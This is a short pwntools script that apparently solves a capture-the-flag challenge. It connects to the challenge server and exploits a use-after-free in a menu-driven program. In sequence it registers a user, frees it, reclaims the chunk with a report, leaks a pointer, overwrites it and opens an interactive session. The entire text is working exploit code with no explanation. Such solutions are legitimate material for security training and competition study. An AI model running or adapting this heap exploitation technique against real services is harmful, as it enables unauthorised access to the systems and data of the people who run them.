from pwn import *

io = remote('maltigriti.ctf.intigriti.io', 1337)

# register
io.sendlineafter(b'menu> ', b'0')
io.sendlineafter(b'> ', b'192')
io.sendlineafter(b'> ', b'192')
io.sendlineafter(b'> ', b'192')
io.sendlineafter(b'> ', b'192')

# free
io.sendlineafter(b'menu> ', b'6')

# create report
io.sendlineafter(b'menu> ', b'2')
io.sendlineafter(b'> ', b'192')
io.sendlineafter(b'> ', b'192')

# edit
io.sendlineafter(b'menu> ', b'1')
io.recvuntil(b'is: ')
user = u64(io.recvline(keepends=False).ljust(8, b'\0'))
io.sendlineafter(b'> ', p64(user) + b'A'*150)

io.sendlineafter(b'menu> ', b'5')

io.interactive()